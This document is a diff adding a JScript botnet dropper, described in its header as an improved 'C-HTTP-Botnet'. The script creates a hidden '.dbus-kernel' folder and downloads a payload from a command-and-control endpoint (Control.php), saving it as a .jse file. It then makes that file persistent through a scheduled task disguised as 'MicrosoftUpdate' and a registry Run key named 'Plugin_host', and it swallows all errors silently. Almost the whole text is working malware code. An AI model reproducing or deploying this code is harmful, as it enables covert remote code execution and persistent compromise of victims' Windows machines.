@@ -1,0 +1,77 @@
+// Equivalencia mejorada de C-HTTP-Botnet
+// ID : SystemAuthority 1
+
+//For me and you (headers)
+var shell  = new ActiveXObject("WScript.Shell");
+var Object = new ActiveXObject('MSXML2.XMLHTTP');
+var wFile  = new ActiveXObject('Scripting.FileSystemObject');
+var SystemEnv = shell.Environment("process");
+
+//Info	
+var ServerPath = "http://127.0.0.1";
+var ControlPath =  ServerPath + "/Control.php";
+var SAversion = 1;
+
+//- This is a bar - - - - - - - 
+try
+{
+	//resolve working variables
+		var Environment, Workspace, SystemPath;
+
+		Environment1 = SystemEnv("USERPROFILE");
+		Environment2 = SystemEnv("APPDATA");
+
+		if (Environment1 > "")
+		{
+			Workspace = Environment1 + "\\" + ".dbus-kernel";
+		}
+		else if(Environment2 > "")
+		{
+			Workspace = Environment2 + "\\" + ".dbus-kernel";
+		}
+
+		SystemPath = Workspace + "\\.dbus-kernel.jse";
+
+	//move
+		if (wFile.FolderExists(Workspace))
+		{
+			//Borrar carpeta
+				wFile.DeleteFolder(Workspace);
+			//Crear otra vez
+				wFile.CreateFolder(Workspace);
+		}
+		else
+		{
+			wFile.CreateFolder(Workspace);
+		}
+
+
+		Object.Open("GET", ControlPath + "?V=new", false);
+		Object.Send();
+
+		if (Object.Status == 200)
+		{
+			// Create the Data Stream
+		    var Stream = new ActiveXObject('ADODB.Stream');
+
+		  // Establish the Stream
+		    Stream.Open();
+		    Stream.Type = 1; // adTypeBinary
+		    Stream.Write(Object.ResponseBody);
+		    Stream.Position = 0;
+
+		  // Write the Data Stream to the File
+		    Stream.SaveToFile(SystemPath, 2); // adSaveCreateOverWrite
+		    Stream.Close();
+		}
+		
+	//create taskschedule
+		shell.Run("SchTasks /Create /SC DAILY /TN \"MicrosoftUpdate\" /TR " +
+			  SystemPath + " /ST 09:00 /RI 300 /DU 12:00",0,true);
+
+	//registrystuff
+		var RegistryPath2 = "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Plugin_host";
+		shell.RegWrite(RegistryPath2, SystemPath ,"REG_SZ" );
+
+}
+catch(nothing){}
